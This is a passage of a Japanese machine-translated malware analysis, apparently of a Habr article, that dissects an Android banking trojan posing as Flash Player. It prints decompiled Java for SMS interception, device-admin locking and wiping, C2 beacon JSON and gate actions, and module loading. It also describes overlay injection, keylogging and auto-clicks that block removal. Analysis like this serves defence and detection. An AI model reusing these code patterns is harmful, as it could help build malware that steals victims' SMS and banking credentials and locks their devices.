<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">読みやすいコード</font></font></b><div class="spoiler_text"><pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> </span>{
<span class="hljs-keyword">public</span> Class[] arrayService = {Service_fa.class, Service_server.class,  Service_event_loop.class};
    <span class="hljs-keyword">if</span> ((!ReadXML(context, "kill").contains("dead")) &amp;&amp; (!cis(context))) {<font></font>
        startAlarm(context, "", <span class="hljs-number">10000</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; arrayService.length; i++) {
            <span class="hljs-keyword">if</span> ((Build.VERSION.SDK_INT &gt;= <span class="hljs-number">26</span>) &amp;&amp; (!DozeMode(context))) <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">if</span> (!isMyServiceRunning(context, arrayService[i])) {
                <span class="hljs-keyword">if</span> (Service_fa.class.getName().equals(arrayService[i].getName())) {<font></font>
                    startService(<span class="hljs-keyword">new</span> Intent(context, arrayService[i]));<font></font>
                } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (Integer.parseInt(ReadXML(context, <span class="hljs-string">"step"</span>)) &gt;= <span class="hljs-number">1</span>) {<font></font>
                    startService(<span class="hljs-keyword">new</span> Intent(context, arrayService[i]));<font></font>
                }<font></font>
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">if</span>(Service_server.class.getName().equals(arrayService[i].getName())){<font></font>
                    stopService(<span class="hljs-keyword">new</span> Intent(context, arrayService[i]));<font></font>
                }<font></font>
            }<font></font>
        }<font></font>
        startOffDozeMode(context);<font></font>
        <span class="hljs-keyword">if</span> (intent.getAction().equals(<span class="hljs-string">"android.provider.Telephony.SMS_RECEIVED"</span>)) {<font></font>
            interceptionSMS(context, intent); <span class="hljs-comment">//  </span><font></font>
        }<font></font>
        <span class="hljs-keyword">if</span> (isAdminDevice(context)) {
            <span class="hljs-keyword">if</span> ((getScreenBoolean(context)) &amp;&amp; (isAccessibilityServiceEnabled(context, srvSccessibility.class))) {
                <span class="hljs-keyword">if</span> (isAccessibilityServiceEnabled(context, srvSccessibility.class)) {<font></font>
                    SaveXML(context, consts.autoClick, "<span class="hljs-number">1</span><span class="hljs-string">");
                }
                Intent intent = new Intent(context, Admin.class);
                intent.putExtra("</span>admin<span class="hljs-string">", "</span><span class="hljs-number">1</span><span class="hljs-string">");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
                intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                startActivity(intent);
            }
        }
    }
    public void  interceptionSMS(Context context, Intent intent){
        Bundle bundle = intent.getExtras();
        if (bundle != null) {
            final Object[] pdus = (Object[]) bundle.get(consts.string_116);
            String number = "</span><span class="hljs-string">";
            String text = "</span><span class="hljs-string">";
            if (pdus != null) {
                for (Object aPdusObj : pdus) {
                    SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) aPdusObj);
                    number = smsMessage.getDisplayOriginatingAddress();
                    text += smsMessage.getDisplayMessageBody();
                }
                SaveXML(context, "</span>LogSMS<span class="hljs-string">",  "</span>Number: <span class="hljs-string">" + number + "</span> Text: <span class="hljs-string">" + text + "</span>::endLog::<span class="hljs-string">");
            }
        }
    }
}</span></code></pre><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
そのため、多くの読者にとってコードが理解しやすくなったと思います。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
受信機には、デバイスの再起動時、SMSの受信時、またはアラームオンの開始時の3つのトリガーがあります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
また、Receiverは3つのサービスを起動します。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">デバイスの身体活動の収集（Service_fa）</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サーバーに接続するためのサービス（Service_server）</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">malvari（Service_event_loop）の一部の機能を実行するための無限のサイクルで実行されるサービス</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
まず、Service_faが起動され、デバイスがアクティブになった後にのみ（電話の所有者が歩いていて、電話が揺れている場合）、Service_serverおよびService_event_loopが起動されます。</font><font style="vertical-align: inherit;">それらは、マルヴァリの主要なプロセスであり、このようにしてマルヴァリは、エミュレーターやレシーバー、AVなどのデバイスから実際のデバイスを取り除くことができます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Receiverは、Dozeモードの切断要求と管理者の確認要求も起動します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
マルウェアには管理者権限があるため、権限を削除するまでデバイスから削除することはできません。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理者権限</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
管理デバイスのおかげで可能性を見てみましょう。</font></font><br>
<br>
<pre><code class="xml hljs"><span class="hljs-comment">&lt;!-- ADMIN DEVICE XML --&gt;</span>
<span class="hljs-meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">device-admin</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">"http://schemas.android.com/apk/res/android"</span> <span class="hljs-attr">android:layout_width</span>=<span class="hljs-string">"match_parent"</span> <span class="hljs-attr">android:layout_height</span>=<span class="hljs-string">"match_parent"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">uses-policies</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">force-lock</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">wipe-data</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">uses-policies</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">device-admin</span>&gt;</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
force-lock要素は、デバイスの画面をロックし、デバイスのDATA、CACHE、およびすべてのメモリを削除するためのデータをワイプします（フルリセット）。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Service_fa</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここで、Receiverを調べ、他のサービスを検討します。</font><font style="vertical-align: inherit;">SensorManagerクラスを使用してセンサーセンサーからデータを取得するサービスです。このサービスは、アクティビティデータを受信して​​XMLファイルに保存するだけです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これのおかげで、悪役はアクティビティの履歴を取得し、それを分析してエミュレータ、特に怠惰なユーザーを排除することができます。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Service_server</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このストリームはサーバーと通信するために作成されました。データは、RC4暗号化アルゴリズムを使用して暗号化された形式でサーバーに送信され、その後にbase64ですべてがエンコードされます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サービスが開始すると、サーバーへの最初のリクエストは次のようになります。</font></font><br>
<br>
<pre><code class="json hljs">    {
        <span class="hljs-attr">"id"</span>:<span class="hljs-string">"qoietjeoisfhjdfhk"</span>,
        <span class="hljs-attr">"idSettings"</span>:<span class="hljs-string">""</span>,
        <span class="hljs-attr">"number"</span>:<span class="hljs-string">"+79999999999"</span>,
        <span class="hljs-attr">"statAdmin"</span>:<span class="hljs-string">"1"</span>,
        <span class="hljs-attr">"statProtect"</span>:<span class="hljs-string">"0"</span>,
        <span class="hljs-attr">"statScreen"</span>:<span class="hljs-string">"1"</span>,
        <span class="hljs-attr">"statAccessibilty"</span>:<span class="hljs-string">"0"</span>,
        <span class="hljs-attr">"statSMS"</span>:<span class="hljs-string">"1"</span>,
        <span class="hljs-attr">"statCards"</span>:<span class="hljs-string">"0"</span>,
        <span class="hljs-attr">"statBanks"</span>:<span class="hljs-string">"0"</span>,
        <span class="hljs-attr">"statMails"</span>:<span class="hljs-string">"0"</span>,
        <span class="hljs-attr">"activeDevice"</span>:<span class="hljs-string">"53"</span>,
        <span class="hljs-attr">"timeWorking"</span>:<span class="hljs-string">"342"</span>,
        <span class="hljs-attr">"statDownloadModule"</span>:<span class="hljs-string">"0"</span>,
        <span class="hljs-attr">"batteryLevel"</span>:<span class="hljs-string">"78"</span>,
        <span class="hljs-attr">"locale"</span>:<span class="hljs-string">"fr"</span><font></font>
    }<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サーバーに送信されたデータをランダムに入力しました。パラメーターの名前によって、すべてが明確であると思うので、どれが何の原因であるかを明確にします。分析は停止しません。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、サーバーの応答を確認し、マルウェアが空の応答を返すかどうかを確認します。空の応答が返された場合は、ループでサーバードメインの配列をソートして、この要求を各ドメインに送信し、応答に== "〜I〜"という行が含まれている場合、マルウェアはこのドメインで停止し、処理を開始します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
処理するドメインを決定しました。今、他の回答を調べています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Response == "|| youNeedMoreResources ||"が返された場合次に、追加のmalvariモジュールを取得するリクエストがサーバーにすぐに送信されます：</font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">gate_url？action = getModule＆data = {"idbot"： "qoietjeoisfhjdfhk"}</font></font></i><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
さあ、レスポンス== "||いいえ||" </font><i><font style="vertical-align: inherit;">gate_url？アクション=登録＆データ= JSON</font></i></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 
リクエストをサーバーに送信します</font><font style="vertical-align: inherit;">。</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font><br>
<pre><code class="json hljs">    {
        <span class="hljs-attr">"id"</span>:<span class="hljs-string">"qoietjeoisfhjdfhk"</span>,
        <span class="hljs-attr">"android"</span>: Build.VERSION.RELEASE,
        <span class="hljs-attr">"tag"</span>:<span class="hljs-string">"tag"</span>,
        <span class="hljs-attr">"country"</span>:<span class="hljs-string">"fr"</span>,
        <span class="hljs-attr">"operator"</span>:<span class="hljs-string">"Megafon"</span>,
        <span class="hljs-attr">"model"</span>:<span class="hljs-string">"Samsung Galaxy S9"</span>
    }</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このリクエストは、管理パネルで新しいユーザーを登録するために使用されます。これはサーバーリクエストの終わりです。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、以下には「system.apk」ファイルの存在をチェックする条件があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
難読化されたコード：</font></font><br>
<br>
<pre><code class="java hljs"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">new</span> File(getDir(<span class="hljs-keyword">this</span>.f301a.f215dd, <span class="hljs-number">0</span>), <span class="hljs-keyword">this</span>.f301a.f115bj).exists()){}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
簡略化されたコード： </font></font><br>
<br>
<pre><code class="java hljs"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> File(getDir(<span class="hljs-string">"apk"</span>, Context.MODE_PRIVATE), <span class="hljs-string">"system.apk"</span>).exists()) {}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ファイルが存在する場合、JSONは次の形式で生成されます。</font></font><pre><code class="json hljs">{
    <span class="hljs-attr">"params"</span>:<span class="hljs-string">"updateSettingsAndCommands"</span>,
    <span class="hljs-attr">"response"</span>:<span class="hljs-string">"data"</span>  
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サーバーからの応答は応答パラメーターに渡され、jsonはsystem.apkモジュールにあるメソッドに渡され、DexClassLoaderクラスを使用して実行されます。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Service_event_loop</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このサービスはループで動作し、デバイスをブロックするコマンドを待ちます。</font><font style="vertical-align: inherit;">デバイスは、管理者権限を使用してループでブロックされています。</font></font><br>
<br>
<pre><code class="java hljs">DevicePolicyManager deviceManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);<font></font>
     deviceManager.lockNow();</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このサービスは管理者権限を無効にする可能性があります。どうやらマルヴァリの作成者は、被害者の電話に痕跡を残さないように、マルヴァリの「自己破壊」のためにこれを行うことにしました。</font></font><br>
<br>
<pre><code class="java hljs">    ComponentName componentName = <span class="hljs-keyword">new</span> ComponentName(<span class="hljs-keyword">this</span>, DeviceAdmin.class);<font></font>
    DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);<font></font>
    devicePolicyManager.removeActiveAdmin(componentName);</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
また、サイクルには1秒と8秒の2つの動作速度があり、アクセシビリティサービスが無効になっている場合、1秒目に動作し、このサービスを有効にするように求め、アクティビティを開き、特別な機能を強制的に有効にします。実際には、これを詳細に検討します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サイクルの終わりには、Service_serverのような実装もありますが、特に、ロードされたモジュール「system.apk」内のメソッドにコマンドを送信しますが、パラメーターに大きな違いはありません。JSONを参照してください。</font></font><br>
<br>
<pre><code class="json hljs">    {
        <span class="hljs-attr">"params"</span>:<span class="hljs-string">"serviceWorkingWhile"</span>,
        <span class="hljs-attr">"tick"</span>:<span class="hljs-string">"100"</span>,
        <span class="hljs-attr">"idbot"</span>:<span class="hljs-string">"qoietjeoisfhjdfhk"</span>,
        <span class="hljs-attr">"accessibility"</span>:<span class="hljs-string">"1"</span>
    }</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
tick-サービスサイクルがカウントする秒数、accessibility-Accesibilityサービスが有効かどうかを確認します。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">クラス文字列（s）</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
クラス内のすべての行はRC4アルゴリズムで暗号化され、その後base64でエンコードされます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
例：</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
暗号化された文字列：yyshybiwijujYzdkZDdkMjRlYjJmYjU5Y2Qw </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ページの最初の12の文字がRC4アルゴリズムの復号鍵です</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
キー：yyshybiwijuj </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
暗号化されたテキスト：YzdkZDdkMjRlYjJmYjU5Y2Qwは</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ここに（ここ）のコード部分だがここでは、コードの一部です</font></font><br>
<br>
<pre><code class="java hljs">    <span class="hljs-comment">/* renamed from: A */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f0A = mo1a(<span class="hljs-string">"yyshybiwijujYzdkZDdkMjRlYjJmYjU5Y2Qw"</span>);<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: B */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f1B = mo1a(<span class="hljs-string">"dfpzkejthefgZDA1NTUyNmJiYWU4M2ViMjhjMGJmNTYx"</span>);<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: C */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f2C = mo1a(<span class="hljs-string">"ewpskxnrtsvaMTBkOWRmZDAxZTZjNjkxZjhiYzYyOA=="</span>);<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: D */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f3D = mo1a(<span class="hljs-string">"ugqxhrpujzmaYTgwZjQ0NjBhN2Y1YmM1MDhjZjdkZWEwYzljZGIxOWY4NDEy"</span>);<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: E */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f4E = mo1a(<span class="hljs-string">"xlzrjjolkozwZTRjOGY5OTZjMTExMTgwYTE0ZGQ="</span>);<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: F */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f5F = mo1a(<span class="hljs-string">"wtxndsosbhnaYzZjNzhhYzA2MDMyMTBkOA=="</span>);<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: G */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f6G = mo1a(<span class="hljs-string">"nmibahlxjjsxM2IzNjY4NGUyZDIzYmYwZGVi"</span>);<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: H */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f7H = mo1a(<span class="hljs-string">"vvgipgmxvxloN2NmZDdlNTkyNjRhYWVlMzkzZGIzMGFiYTUzM2E5"</span>);<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: I */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String f8I = mo1a(<span class="hljs-string">"zuqkhqhqsrvgMDczYWRkZmYyOTE5NmVmMzk2Yzc="</span>);</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これらの文字列データを通常のビューに変換するスクリプトを作成しました。これにより、少し時間が経過するのに役立ちました。 </font></font><br>
<br>
<pre><code class="java hljs">    <span class="hljs-comment">/* renamed from: A */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_statMails = <span class="hljs-string">"statMails"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: B */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_activeDevice = <span class="hljs-string">"activeDevice"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: C */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_timeWorking = <span class="hljs-string">"timeWorking"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: D */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_statDownloadModule = <span class="hljs-string">"statDownloadModule"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: E */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_lockDevice = <span class="hljs-string">"lockDevice"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: F */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_offSound = <span class="hljs-string">"offSound"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: G */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_keylogger = <span class="hljs-string">"keylogger"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: H */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_activeInjection = <span class="hljs-string">"activeInjection"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: I */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_timeInject = <span class="hljs-string">"timeInject"</span>;</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このクラスに何が格納されているかも確認できます。</font></font><br>
<br>
<pre><code class="java hljs">    <span class="hljs-comment">/* renamed from: ay */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_url = <span class="hljs-string">"https://twitter.com/LukasStefanko"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: az */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_Accessibility = <span class="hljs-string">"Flash Player Service"</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: bb */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_gate1 = <span class="hljs-string">"action=registration&amp;data="</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: bc */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_gate2 = <span class="hljs-string">"action=sendInjectLogs&amp;data="</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: bd */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_gate3 = <span class="hljs-string">"action=sendSmsLogs&amp;data="</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: be */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_gate4 = <span class="hljs-string">"action=timeInject&amp;data="</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: bf */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_gate5 = <span class="hljs-string">"action=sendKeylogger&amp;data="</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: bg */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_gate6 = <span class="hljs-string">"action=getModule&amp;data="</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: bh */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_gate7 = <span class="hljs-string">"action=checkap&amp;data="</span>;<font></font>
<font></font>
    <span class="hljs-comment">/* renamed from: bj */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> String str_country = <span class="hljs-string">"[ua][ru][by][tj][uz][tm][az][am][kz][kg][md]"</span>;</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サーバーのURLにLukas Stefanko（@LukasStefanko）が示され、明らかに作者がLucas（これはNOD32のアナリストです）に冗談を言ったり何かを言いたかったのですが、Accessibility Service +という名前もマニフェストandroidに保存されています：label =“ Flash Playerサービス」、およびマルウェアが機能しない国のリスト。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">残り</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
注射の仕事を簡単に説明してください。</font><font style="vertical-align: inherit;">これは、Accessibility Serviceが有効になっている場合に簡単に実装されます。このサービスは、銀行アプリケーションの起動イベントを単にキャッチし、銀行のアクティビティの上にそのアクティビティを起動します。WebViewオブジェクトは、銀行のHTML偽物をダウンロードし、その後JavaScriptを使用してデータを受信し、データを送信します。 Malvariサーバー。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
また、このサービスにはキーロガーが実装されており、マルウェアの削除をブロックし、確認時に自動クリックします。</font><font style="vertical-align: inherit;">com.miui.securitycenterアプリケーションでセキュリティ切断の相互作用が検出されました。</font><font style="vertical-align: inherit;">このアプリケーションは「セキュリティ」と呼ばれ、Xiaomiデバイスで使用されます。その主なタスクは、機密データのセキュリティを監視することです。</font><font style="vertical-align: inherit;">autoclickメソッドを使用して「Google Playプロテクト」を自動的にオフにするコードも見つかりました。</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">練習に移りましょう</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
悪役のツイッターを見つけ、管理パネルのスクリーンショットを取得しました</font></font><br>
<br>
<img src="https://habrastorage.org/getpro/habr/post_images/ff3/d9e/c29/ff3d9ec29b0ab525130052b32a9d2a10.png" alt="画像"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
。API27を使用してエミュレータにapkパッケージをインストールします</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
「Flash Player」という名前のFlashプレーヤーのアイコンがデスクトップに表示されました</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">スクリーンショット</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/ff2/516/805/ff25168051a4d17b8b22b15daac7244a.png" alt="画像"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
アイコンを待ち、マルウェアを実行します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Malvariを起動すると、Activityは自動的にAccessibility Serviceを有効にするための要件から始まります。最小化すると、再び表示され、サービスをオンにするまでのサイクルでこれが発生します。</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">スクリーンショット</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/9c9/cbd/98c/9c9cbd98c2afaf3750d131a5003e9c9e.png" alt="画像"><img src="https://habrastorage.org/getpro/habr/post_images/e1d/9c1/48e/e1d9c148e24105b8db66848ae777fd79.png" alt="画像"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
アクセシビリティサービスのチェックボックスをオンにした後、設定からデスクトップに自動的に切り替わり、アクセシビリティサービスの設定に入ることができなくなった。デスクトップアイコンも消え、Dozeモードのシャットダウン要求が表示された後、特別な機能の自動クリックにより自動的にオフになった。 </font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">スクリーンショット</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/getpro/habr/post_images/d57/1b2/841/d571b28415c001fa433e5c171aecb2a1.png" alt="画像"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、同じ方法で管理者権限の自動確認が行われました。</font><font style="vertical-align: inherit;">このアプリケーションの設定を開くと、自動的に終了したため（GLOBAL_ACTION_BACK）、マルウェアを手動で削除することはできませんでした。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
実際、これは最初の部分ですべてです。サーバーへの有効なリンクを持つマルウェアのapkファイルが見つからなかったため、このボットのメインモジュールを使用して、すぐに2番目の部分を追加します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
マルバリリバースは、と組み合わせて実装されました</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u=" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">keklick1337</font></font></a></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja459840/index.html">Xamarin.FormsのXAMLホットリロードがリリースされました</a></li>
<li><a href="../ja459842/index.html">ルクソール</a></li>
<li><a href="../ja459844/index.html">ウィンドウ内のペンギン：WSL2の可能性と展望</a></li>
<li><a href="../ja459850/index.html">アマチュア無線技術：中国の工場でプリント基板の取り付けを注文した方法</a></li>
<li><a href="../ja459852/index.html">銀行のモバイルアプリケーションで宝くじライブラリを使用する方法</a></li>
<li><a href="../ja459860/index.html">gitlab-ciでの統合テストのためのClickHouseの構成</a></li>
<li><a href="../ja459862/index.html">Berkeley DB STLインターフェイス</a></li>
<li><a href="../ja459866/index.html">pwnable.kr 02による問題解決-衝突。ハッシュ衝突</a></li>
<li><a href="../ja459870/index.html">FのModel-View-Updateアーキテクチャの例＃</a></li>
<li><a href="../ja459872/index.html">パットンジェフ。ユーザーストーリー。アジャイルソフトウェア開発の芸術</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
